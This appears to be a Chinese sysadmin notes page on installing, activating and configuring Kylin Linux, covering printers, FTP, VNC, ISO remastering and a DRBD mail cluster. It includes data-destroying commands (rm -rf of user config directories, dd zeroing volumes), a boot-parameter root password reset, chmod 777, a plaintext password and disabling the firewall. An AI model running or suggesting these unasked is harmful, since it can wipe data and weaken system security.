href="https://iso.kylinos.cn/web_pungi/download/cdn/kz4Ju6NbSg7DUA9mlf5M2rqZeBRat1vC/">Kylin-Server-V11-2503-Release-General-20250715-X86_64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/9D2GPNhvxfsF3BpmRbJjlKu0dowkAc4i/">Kylin-Server-V10-SP3-2403-Release-20240426-x86_64.iso</a></p><blockquote><p>中标V7</p></blockquote><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/vuZcr27xpAb69Nfet4iaLyD1J8KBVhqP/">NeoKylin-Server7.0-Release-Build09.06-20220311-X86_64.iso</a></p><h3 id="1-2-2-ARM"><a href="#1-2-2-ARM" class="headerlink" title="1.2.2 ARM"></a>1.2.2 ARM</h3><blockquote><p>飞腾、鲲鹏</p></blockquote><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/2r9DfSBgAkQu4atRG3zFdnIshlTbVCPo/">Kylin-Server-V11-2503-Release-General-20250715-ARM64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/ni3tIfZoEKLDglszRXvh9WymuwOT5r6M/">Kylin-Server-V10-SP3-2403-Release-20240426-arm64.iso</a></p><h3 id="1-2-3-龙芯"><a href="#1-2-3-龙芯" class="headerlink" title="1.2.3 龙芯"></a>1.2.3 龙芯</h3><blockquote><p>LoongArch</p></blockquote><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/HsNdCbacX6gEiS2UvTFf8uqQAkI0Ohyz/">Kylin-Server-V11-2503-Release-General-20250715-LoongArch64.iso</a></p><p>3B5000 <a href="https://iso.kylinos.cn/web_pungi/download/cdn/tLh71VaxXSoTDP8yBz4YnrMZlmk3QvGJ/">Kylin-Server-V10-SP3-2403-Release-20240426-loongarch64.iso</a></p><p>3B5000 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/TUNXQn13jSosWaVuKBIDJ7v6tbryYAeR/Kylin-Server-V10-SP3-General-Release-2303-LoongArch64.iso">Kylin-Server-V10-SP3-General-Release-2303-LoongArch64.iso</a></p><p>3B4000 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/dEbpCiHZgYvxNwAmW2XlTVOPRS6h30nq/">Kylin-Server-10-SP1-Release-Build18-20210809-mips64el.iso</a></p><blockquote><p>mips64el</p></blockquote><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/dEbpCiHZgYvxNwAmW2XlTVOPRS6h30nq/">Kylin-Server-10-SP1-Release-Build18-20210809-mips64el.iso</a></p><h2 id="1-3-安装系统"><a href="#1-3-安装系统" class="headerlink" title="1.3 安装系统"></a>1.3 安装系统</h2><pre><code class="hljs bash"><span class="hljs-comment"># 系统安装方式有：光盘、USB、PXE、IBMC（服务器）</span></code></pre><h3 id="进入Boot-Menu"><a href="#进入Boot-Menu" class="headerlink" title="进入Boot Menu"></a>进入Boot Menu</h3><pre><code class="hljs bash">每个整机进入Boot Menu的方式都不一样，国产机通常是F12，有的是F11、F7等。在开机的时候看黑屏时左下角一般写 Press F12 to Boot Menu,以下图为例：下图为进入服务器变化的第一个界面，这个停留时间比较长，桌面停留时间较短。根据左下角提示进入Boot Menu，简单说明一下下图左下角什么意思：1.按del进入BIOS设置2.按F12进入PXE模式(PXE网络方式大批量灌装)3.按F2到系统引导选择菜单，下图为Boot Option，有的是Boot Menu，都是一个意思4.按F6到SP boot，没用过，可能是要加载一些第三方驱动的方式进入。所以通过这个能看出来，这个服务器是按F2进入系统引导选择菜单</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912115431149.png" alt="img"></p><h3 id="进入安装界面"><a href="#进入安装界面" class="headerlink" title="进入安装界面"></a>进入安装界面</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912115608057.png" alt="img"></p><h2 id="1-4-激活系统"><a href="#1-4-激活系统" class="headerlink" title="1.4 激活系统"></a>1.4 激活系统</h2><pre><code class="hljs bash">1. 登录麒麟系统终端输入 kylin-system-verify 回车；2. 输入序列号后回车，回激活 二维码；3. 打开麒麟软件客服，点击右下角的 “扫描二维码” 扫描系统上显示的二维码；4. 输入服务序列号后，点击激活，界面上会显示激活码；5. 在服务器上回车后，将麒麟软件客服上得到的激活码输入到服务器操作系统上即可激活；6. 检查激活状态，输入 kylin_activation_check 即可查看当前激活状态。<span class="hljs-comment"># 无法加载激活码，可以联网</span>apt install kylin-activation --reinstallapt install libkylin-activation --reinstall<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> -rf /etc/.kyhwid &amp;&amp; <span class="hljs-built_in">sudo</span> kylin_activation_check</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912114804109.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912114838173.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912114856093.png" alt="img"></p><h3 id="激活信息备份"><a href="#激活信息备份" class="headerlink" title="激活信息备份"></a>激活信息备份</h3><pre><code class="hljs bash">激活后注意备份激活信息，不要激活测试机1.备份注册码<span class="hljs-built_in">sudo</span>  kylin_gen_register2.备份激活码<span class="hljs-built_in">sudo</span>   <span class="hljs-built_in">cat</span>   /etc/.kyactivation3.备份序列号<span class="hljs-built_in">sudo</span>  kylin_serial这些激活信息建议收集后存成文档备份。</code></pre><h3 id="激活后重新激活"><a href="#激活后重新激活" class="headerlink" title="激活后重新激活"></a>激活后重新激活</h3><pre><code class="hljs bash">激活后同一机器硬件不变原则可重复激活，因为激活同主板、硬盘、mac地址有关。除非以下几种情况：1.产线KMS激活后信息未导给麒麟。2.华为OEM版激活的机器尽量不要重装，通过OEM版激活的重复激活需找华为。3.华为990及9006C重装前必须获取原注册码激活码，或重装到原状态的版本以990为例机器有以下四个版本，其激活码不一致990-2203通用990-2203+掉激活补丁--保密套件990-2303-update1990-2303-update2</code></pre><h3 id="激活常见FAQ"><a href="#激活常见FAQ" class="headerlink" title="激活常见FAQ"></a>激活常见FAQ</h3><pre><code class="hljs bash">1.客户扫描桌面二维码后，在微信上不出现之前绑定的二维码版本不一致2.扫码报0009：序列号或激活码填错了3.扫码报0017：硬件信息未能获取到注册码4.不出现二维码：硬件信息未能获取到5.扫码激活按钮为灰色：缺.kyinfo及LICENSE以上可使用我提供的脚本处理或拨打400-089-1870找400处理</code></pre><h1 id="二、桌面"><a href="#二、桌面" class="headerlink" title="二、桌面"></a>二、桌面</h1><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h3><pre><code class="hljs bash"><span class="hljs-comment"># 用户的回收站</span><span class="hljs-built_in">cd</span> ~/.local/share/Trash/files/</code></pre><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><pre><code class="hljs bash"><span class="hljs-comment"># 进入单用户模式，修改root密码或者是开机用户的密码</span><span class="hljs-comment"># 1. 重启主机，在选择界面按: e</span><span class="hljs-comment"># 2. 将 linux 行的 ro 修改成 rw</span><span class="hljs-comment"># 3. 在 Linux 行的 audit=0后面或者 security 之前添加 init=/bin/bash console=tty0</span><span class="hljs-comment">## 其他</span>1.删除缓存文件<span class="hljs-built_in">rm</span> /var/log/tallylog.d/.*2.解锁用户pam_tally2 --user=jy --reset3.改密码passwd jy，密码要有一定复杂度，注意大小写及不要用小键盘，建议先改ab123123，然后进系统图形化再修改</code></pre><h3 id="刻录"><a href="#刻录" class="headerlink" title="刻录"></a>刻录</h3><pre><code class="hljs bash">apt --reinstall install kylin-burner<span class="hljs-comment"># https://archive.kylinos.cn/kylin/KYLIN-ALL/pool/main/k/kylin-burner/</span><span class="hljs-comment"># 银河麒麟桌面操作系统V10-0710等较老版本：sudo apt install --reinstall brasero</span><span class="hljs-comment"># 银河麒麟桌面操作系统V10-2203等较新版本：sudo apt install --reinstall kylin-burner</span><span class="hljs-comment"># 银河麒麟桌面操作系统V10-SP1：sudo apt install --reinstall kylin-burner</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912122941860.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912122956018.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123021830.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123047485.png" alt="img"></p><p>光盘刻录器</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123141000.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123209683.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123232695.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123248752.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123302962.png" alt="img"></p><p>追加刻录</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123330419.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123343439.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123357509.png" alt="img"></p><h3 id="清理缓存"><a href="#清理缓存" class="headerlink" title="清理缓存"></a>清理缓存</h3><pre><code class="hljs bash"><span class="hljs-comment"># WPS卡顿</span><span class="hljs-built_in">rm</span> -rf .config/ .cache/ .<span class="hljs-built_in">local</span>/<span class="hljs-built_in">sudo</span> systemctl restart lightdm</code></pre><h2 id="默认配置"><a href="#默认配置" class="headerlink" title="默认配置"></a>默认配置</h2><h3 id="源"><a href="#源" class="headerlink" title="源"></a>源</h3><pre><code class="hljs bash">2403<span class="hljs-comment">#本文件由源管理器管理，会定期检测与修复，请勿修改本文件</span>deb http://archive.kylinos.cn/kylin/KYLIN-ALL 10.1 main restricted universe multiversedeb http://archive.kylinos.cn/kylin/KYLIN-ALL 10.1-2403-updates main restricted universe multiversedeb http://archive2.kylinos.cn/deb/kylin/production/PART-V10-SP1/custom/partner/V10-SP1 default all</code></pre><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="下载软件包"><a href="#下载软件包" class="headerlink" title="下载软件包"></a>下载软件包</h3><pre><code class="hljs bash"><span class="hljs-comment"># 更新源</span><span class="hljs-built_in">sudo</span> apt update<span class="hljs-comment"># 下载单个软件包及其依赖。下载的文件默认保存在 /var/cache/apt/archives/ 目录下，均为 .deb 格式。</span>apt-get install -d &lt;package-name&gt;</code></pre><h3 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h3><pre><code class="hljs bash">apt install wineapt install kylin-wine-assistant</code></pre><p>打开麒麟Wine助手</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912101426921.png" alt="img"></p><p>创建一个windows10架构的容器</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912101743369.png" alt="img"></p><p>运行一个 xxx.exe 应用</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912102047688.png" alt="img"></p><h3 id="FTP工具使用"><a href="#FTP工具使用" class="headerlink" title="FTP工具使用"></a>FTP工具使用</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123550035.png" alt="img"></p><p>添加站点</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123617554.png" alt="img"></p><p>填写站点信息</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123642071.png" alt="填写站点信息"></p><p>填写站点信息</p><p>设置字符集</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912123722705.png" alt="设置字符集"></p><p>设置字符集</p><p>连接使用即可。</p><h3 id="打印机设置"><a href="#打印机设置" class="headerlink" title="打印机设置"></a>打印机设置</h3><pre><code class="hljs bash"><span class="hljs-comment"># 除佳能外，都可以测试一下general里面的pcl5和6</span><span class="hljs-comment"># 驱动去麒麟官网查https://eco.kylinos.cn/zoology/commercial.html?system_class=1</span><span class="hljs-comment"># 佳能的官网https://www.canon.com.cn/supports/download/sims/search/index</span></code></pre><p>搭建打印机</p><pre><code class="hljs bash">左下角开始菜单---控制面板---打印机</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124209132.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124238986.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124254318.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124313340.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124326551.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124339449.png" alt="img"></p><p>修改打印机连接方式</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124400651.png" alt="img"></p><p>修改打印机驱动</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124424590.png" alt="img"></p><h3 id="设置共享打印机"><a href="#设置共享打印机" class="headerlink" title="设置共享打印机"></a>设置共享打印机</h3><pre><code class="hljs bash"><span class="hljs-comment"># 流程</span>1.两台电脑，一台连着打印机为电脑A，另一台电脑B需要远程连接电脑A进行打印2.电脑A修改防火墙，添加共享打印机端口3.电脑A配置共享端打印机4.电脑B查找电脑A的打印机<span class="hljs-comment"># 备注</span>1.麒麟传输端口为9696</code></pre><p>电脑A修改防火墙（安全中心&gt;网络保护-&gt;防火墙（设置“定义配置”）），取消cpusd，添加UDP和TCP的631端口</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124808112.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124823844.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124843593.png" alt="img"></p><p>打印机A配置共享打印机</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124942245.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912124954933.png" alt="img"></p><p>打印机B添加打印机</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912125038902.png" alt="img"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="打包deb"><a href="#打包deb" class="headerlink" title="打包deb"></a>打包deb</h3><pre><code class="hljs bash"><span class="hljs-comment"># 目录架构</span>proj    |   ├── DEBIAN    │   ├── control //里面包含文件的基本信息，如项目名，版本号，文件等    │   ├── postinst.sh //安装后操作，下类似    │   ├── postrm.sh    │   ├── preinst.sh    │   └── prerm.sh    ├── opt    │   └── your_exec_proj //你的可执行文件    └── usr        ├── icons        │   ├── logo.ico        │   └── logo.png // 软件图标        ├── share        │   └── applications            │   └── ***.desktop //快捷方式脚本            <span class="hljs-comment"># control 写法</span>Package: 软件包名  Version: 版本号Architecture: amd64  // 源代码包名字 Source: gentoo // 该源码包要进入发行版中的分类 Section: unknown Priority: optional // 维护人员 Maintainer: Josip Rodin &lt;joy-mg@debian.org&gt; Build-Depends: debhelper (&gt;=10) Standards-Version: 4.0.0 Homepage: &lt;insert the upstream URL, <span class="hljs-keyword">if</span> relevant&gt; Package: gentoo Depends: <span class="hljs-variable">$&#123;shlibs:Depends&#125;</span>, <span class="hljs-variable">$&#123;misc:Depends&#125;</span> Description: 你的软件描述<span class="hljs-comment"># ***.desktop 写法</span>[Desktop Entry]  Name=应用名  Name[zh_CN]=应用中文名<span class="hljs-comment">#   Categories=type为Application时有用，表示应用程序在菜单中显示的类别</span>  Comment=对项目的简单描述  //应用程序的可执行路径  Exec=/opt/your_exec_proj  //应用显示的图标  Icon=/usr/icons/logo.png  //是否显示黑框框   Terminal=<span class="hljs-literal">false</span>  //Desktop Entry文件的类型  Type=Application  X-Deepin-Vendor=user-custom  X-ubuntu-Touch=<span class="hljs-literal">true</span></code></pre><p>打包字体</p><pre><code class="hljs bash"><span class="hljs-comment">## 打包字体包</span><span class="hljs-comment"># QT应用依赖安装</span><span class="hljs-built_in">sudo</span> apt install dh-make dpkg-dev<span class="hljs-comment"># 字体必须目录</span>Font_DIR    |    ├── DEBIAN    │   └── control //里面包含文件的基本信息，如项目名，版本号，文件等    └── usr        ├── share        │   └── fonts            │   └── fzfonts //方正字体目录                │   └── 方正黑体_GBK.TTF                │   └── 方正行楷_GBK.ttf                ...<span class="hljs-comment"># control文件信息</span>Package: my-java-appVersion: 1.0Architecture: allDepends: default-jreDescription: Java application packaged as DEB.                    (此处必须空一行再结束)  <span class="hljs-comment"># 打包</span> <span class="hljs-built_in">sudo</span> dpkg -b Font_DIR <span class="hljs-comment"># 生成Font_DIR.deb</span></code></pre><hr><h1 id="三、服务器"><a href="#三、服务器" class="headerlink" title="三、服务器"></a>三、服务器</h1><h3 id="手动配置网卡"><a href="#手动配置网卡" class="headerlink" title="手动配置网卡"></a>手动配置网卡</h3><pre><code class="hljs bash"><span class="hljs-comment"># 编辑网卡</span><span class="hljs-built_in">sudo</span> vi /etc/sysconfig/network-scripts/ifcfg-ens33<span class="hljs-comment"># 配置</span>DEVICE=eth0TYPE=EthernetBOOTPROTO=staticONBOOT=<span class="hljs-built_in">yes</span>IPADDR=192.168.1.100NETMASK=255.255.255.0GATEWAY=192.168.1.1DNS1=8.8.8.8DNS2=8.8.4.4<span class="hljs-comment"># 重启网络配置</span>systemctl restart NetworkManager<span class="hljs-comment"># 启停网卡</span>ifconfig ens33 upifconfig ens33 down</code></pre><h2 id="常见服务"><a href="#常见服务" class="headerlink" title="常见服务"></a>常见服务</h2><h3 id="vsftp"><a href="#vsftp" class="headerlink" title="vsftp"></a>vsftp</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装vsftp和ftp包</span>yum -y install vsftpd ftp<span class="hljs-comment"># 2. 创建ftpd FTP用户并设置密码</span>useradd ftpd<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Kylin@password1234&quot;</span> | passwd --stdin ftpd<span class="hljs-comment"># 3. 创建FTP文件夹和文件</span><span class="hljs-built_in">mkdir</span> -p /home/ftpd/test<span class="hljs-built_in">chmod</span> -R 777 /home/ftpd/test/<span class="hljs-comment"># 4. 编辑vsftpd的配置文件, 在文件后添加以下配置</span>vim /etc/vsftpd/vsftpd.confuserlist_enable=YESlocal_root=/home/ftpd/testlocal_enable=YES<span class="hljs-comment"># 5. 重启vsftpd服务并检查状态</span>systemctl restart vsftpdsystemctl status vsftpd<span class="hljs-comment"># 6. 测试FTP连通性</span>ftp 127.0.0.1ftpdKylin@password1234<span class="hljs-built_in">exit</span><span class="hljs-comment"># 7. 其他：检查防火墙状态</span>systemctl status firewalld</code></pre><h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><p>安装</p><pre><code class="hljs bash"><span class="hljs-comment"># 有网：dnf install tigervnc-server</span><span class="hljs-comment"># 离线官网下载 https://update.cs2c.com.cn/NS/V10/V10SP3/os/adv/lic/base/aarch64/Packages/</span><span class="hljs-comment"># rpm -ivh tigervnc-server-1.10.1-5.p04.ky10.aarch64.rpm</span></code></pre><p>设置密码</p><pre><code class="hljs bash"><span class="hljs-comment"># 打开终端执行：vncpasswd</span><span class="hljs-comment"># 长度要求8位，复杂度要求4种字符</span></code></pre><p>开启VNC服务</p><pre><code class="hljs bash">vncserver</code></pre><p>查看VNC服务器</p><pre><code class="hljs bash">ps -ef | grep vnc<span class="hljs-comment"># 看到端口是5901</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912125427491.png" alt="img"></p><p>防火墙关闭或放开端口</p><pre><code class="hljs bash">systemctl stop firewalld.service</code></pre><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><pre><code class="hljs bash"><span class="hljs-comment"># 查看路由表</span>route -n<span class="hljs-comment"># </span>route add default gw 192.168.1.1 dev eth0 metric 204route del default gw 192.168.1.1 eth0</code></pre><h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><pre><code class="hljs bash"><span class="hljs-comment"># 在opt⽬录下进⾏操作 </span><span class="hljs-built_in">cd</span> /opt/<span class="hljs-built_in">mkdir</span> mnt livecd tool<span class="hljs-comment"># 上传要定制的系统ISO到 /opt/tool/ </span><span class="hljs-comment"># 挂载ISO镜像到 /opt/mnt/下 </span>mount /opt/tool/ubuntu-16.04.2-server-amd64.iso /opt/mnt/<span class="hljs-comment"># 复制所有的镜像⽂件到/opt/livecd/下 </span><span class="hljs-built_in">cp</span> -rp /opt/mnt/. /opt/livecd/ <span class="hljs-comment"># 取消镜像挂载 </span>umount /opt/mnt/ <span class="hljs-comment"># 解压filesystem.squashfs⽂件到当前⽬录，解压出来的⽬录squashfs-root </span><span class="hljs-built_in">cd</span> /opt/livecd/casper/ unsquashfs filesystem.squashfs <span class="hljs-comment"># 切换进新的系统 </span><span class="hljs-built_in">chroot</span> squashfs-root mount -t proc none /proc mount -t sysfs none /sys mount -t devpts none /dev/pts <span class="hljs-comment"># 先退出squashfs-root系统 </span><span class="hljs-built_in">exit</span> <span class="hljs-built_in">cp</span> 安装包 /opt/livecd/casper/squashfs-root/tmp <span class="hljs-comment"># 切换进新的系统 </span><span class="hljs-built_in">chroot</span> squashfs-root<span class="hljs-built_in">cd</span> /tmp dpkg -i 安装包 <span class="hljs-built_in">rm</span> -rf /tmp/* umount /proc umount /sys umount /dev/pts <span class="hljs-built_in">exit</span> <span class="hljs-comment"># 重新配置并压缩根⽂件系统 </span><span class="hljs-built_in">cd</span> /opt/livecd/casper<span class="hljs-built_in">rm</span> filesystem.squashfs <span class="hljs-comment">#删除原来的操作系统压缩⽂件 </span>mksquashfs squashfs-root filesystem.squashfs -comp xz<span class="hljs-built_in">printf</span> $(<span class="hljs-built_in">du</span> -sx --block-size 1 squashfs-root |<span class="hljs-built_in">cut</span> -f1) &gt;filesystem.size <span class="hljs-built_in">rm</span> -r squashfs-root <span class="hljs-built_in">cd</span> /opt/livecd/ <span class="hljs-built_in">rm</span> md5sum.txt find -<span class="hljs-built_in">type</span> f -print0 | xargs -0 <span class="hljs-built_in">md5sum</span>|grep -v isolinux/boot.cat |<span class="hljs-built_in">tee</span> md5sum.txt 8.制作ISO镜像 ，这一步，看是否是arm架构的，不是的话执行下面的。<span class="hljs-built_in">cd</span> /opt/livecd/ mkisofs -J -r -V <span class="hljs-string">&quot;Kylin-Desktop-V10-Lenovo&quot;</span> -cache-inodes -l -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 - boot-info-table -eltorito-alt-boot -e boot/grub/efi.img -no-emul-boot -o /opt/Test.iso . <span class="hljs-comment">#Test.iso名字⾃⼰定 </span>通过上⾯的命令⽣成的iso即可以采⽤UEFI的⽅式进⾏安装，也可以采⽤leagcy 的⽅式进⾏安装 -V 后⾯加的内容为ISOV10   飞腾、ARM结构：genisoimage -e boot/grub/efi.img -no-emul-boot -T -J -R -c boot.catalog -hide boot.catalog -V <span class="hljs-string">&quot;Kylin-V10-desktop-DK&quot;</span> -o /opt/Kylin-V10-desktop-DK.iso .Mipsmkisofs -b casper/initrd.img -no-emul-boot -T -J -R -c boot.catalog -hide boot.catalog -V <span class="hljs-string">&quot;V10-desktop-mips64el&quot;</span> -o /opt/V10-desktop-mips64el.iso .</code></pre><hr><h1 id="四、邮件系统"><a href="#四、邮件系统" class="headerlink" title="四、邮件系统"></a>四、邮件系统</h1><h2 id="中标V7邮件系统部署"><a href="#中标V7邮件系统部署" class="headerlink" title="中标V7邮件系统部署"></a>中标V7邮件系统部署</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><pre><code class="hljs bash"></code></pre><h3 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h3><pre><code class="hljs bash"><span class="hljs-comment"># 需要依赖，最好有图形化服务</span>yum  groupinstall <span class="hljs-string">&quot;Server with UKUI GUI&quot;</span><span class="hljs-comment"># 关闭防火墙</span>systemctl stop firewalldsystemctl <span class="hljs-built_in">disable</span> firewalld</code></pre><h3 id="划分磁盘"><a href="#划分磁盘" class="headerlink" title="划分磁盘"></a>划分磁盘</h3><pre><code class="hljs bash"><span class="hljs-comment"># 创建物理卷. pvdisplay | pvscan</span>pvcreate /dev/sdbpvcreate /dev/sdc<span class="hljs-comment"># 创建卷组 vgcreate vg_name pv_name. vgdisplay | vgscan</span><span class="hljs-comment"># node1</span>vgcreate datanode1 /dev/sdbvgcreate datanode2 /dev/sdc<span class="hljs-comment"># node2</span>vgcreate datanode3 /dev/sdbvgcreate datanode4 /dev/sdc<span class="hljs-comment"># 创建逻辑卷. lvdisplay</span><span class="hljs-comment"># node1</span>lvcreate -n node1 -l 100%FREE datanode1lvcreate -n node2 -l 100%FREE datanode2<span class="hljs-comment"># node2</span>lvcreate -n node3 -l 100%FREE datanode3lvcreate -n node4 -l 100%FREE datanode4<span class="hljs-comment"># drbd设备初始化操作</span><span class="hljs-comment"># node1</span><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/datanode1/node1 bs=1M count=100<span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/datanode2/node2 bs=1M count=100<span class="hljs-comment"># node2</span><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/datanode3/node3 bs=1M count=100<span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/datanode4/node4 bs=1M count=100</code></pre><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code class="hljs bash"><span class="hljs-comment"># 安装软件</span>rpm -ivh --force nsmail-8.3.0.xxx.rpm<span class="hljs-comment"># 集群服务启停</span>/opt/AQYJ/nsmail/init.d/nsmailservice   /opt/AQYJ/nsmail/init.d/php  /opt/AQYJ/nsmail/init.d/cs2cmailsh.php  clustermail start</code></pre><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><pre><code class="hljs bash"><span class="hljs-comment">## 访问集群url</span>http://192.168.110.101:8022<span class="hljs-comment">## 创建主机群；主机管理-创建</span>node1-manager       192.168.110.101node1-storage       192.168.120.101node1-hearbeat      192.168.130.101node1-vip           192.168.110.103node2-manager       192.168.110.102node2-storage        192.168.120.102node2-hearbeat      192.168.130.102node2-vip           192.168.110.104<span class="hljs-comment">## 创建第一组DRBD磁盘关系</span>资源名称        drbd0节点IP          设置node1存储的IP物理IP          设置node1的管理IP端口号默认      20000块设备          设置node1服务器的第一块盘对端节点IP      设置node2的存储IP对端物理节点IP  设置node2的管理IP对端节点块设备  设置node2服务器的第一块盘端口号默认      20000<span class="hljs-comment">## 创建第二组DRBD磁盘关系</span>资源名称        drbd1   节点IP          设置node2存储的IP物理IP          设置node2的管理IP端口号          设置20001块设备          设置node2服务器的第二块盘对端节点IP      设置node1的存储IP对端物理节点IP  设置node1的管理IP对端节点块设备  设置node1服务器的第二块盘端口号默认      20001<span class="hljs-comment">## drbd磁盘格式化</span><span class="hljs-comment"># Drbd管理 - 点击“查看”按钮</span>查看磁盘同步是否完成100%，手动执行磁盘格式化步骤: 在 node1 服务器手动格式化 drbd0 磁盘<span class="hljs-built_in">sudo</span> mkfs.ext4 /dev/drbd0步骤: 在 node2 服务器手动格式化 drbd1 磁盘<span class="hljs-built_in">sudo</span> mkfs.ext4 /dev/drbd1<span class="hljs-comment">## 创建节点组</span><span class="hljs-comment"># 集群管理 &gt; 添加节点组</span><span class="hljs-comment">## 创建集群组-添加节点组</span><span class="hljs-comment">## 创建集群组-添加虚拟IP</span><span class="hljs-comment">## 创建集群组-添加心跳</span><span class="hljs-comment">## 创建集群组-创建存储</span><span class="hljs-comment">## 创建集群组-确认配置</span><span class="hljs-comment">## 集群发布</span><span class="hljs-comment">## 集群启用</span><span class="hljs-comment">## 集群序列号激活 ```XXJW```</span><span class="hljs-comment">## 管理员访问方式</span><span class="hljs-comment">## 用户访问方式</span><span class="hljs-comment">## 快速上手</span><span class="hljs-comment"># 登录系统管理员-mail_admin</span><span class="hljs-comment"># 创建企业及域名</span><span class="hljs-comment"># 登录并重置企业管理员密码</span><span class="hljs-comment">## </span></code></pre><h3 id="优化-问题"><a href="#优化-问题" class="headerlink" title="优化&amp;问题"></a>优化&amp;问题</h3><pre><code class="hljs bash"><span class="hljs-comment">## sp3的版本适配问题 -- 夏杰大佬 （创建第一组DRBR磁盘关系的时候发现 “快设备” 没有识别）解决方法</span><span class="hljs-comment"># 环境信息：release V10 SP3 2403/(Halberd)-x86_64-Build20/20240426</span><span class="hljs-comment"># 两个节点都需要执行以下操作</span><span class="hljs-built_in">cd</span> /opt/AQYJ/nsmail/bin<span class="hljs-built_in">mv</span> fdisk  fdisk_bak<span class="hljs-built_in">mv</span> sqlite3 sqlite3_bak<span class="hljs-built_in">ln</span> -s  /usr/sbin/fdisk  /opt/AQYJ/nsmail/bin/fdisk<span class="hljs-built_in">ln</span> -s /usr/bin/sqlite3 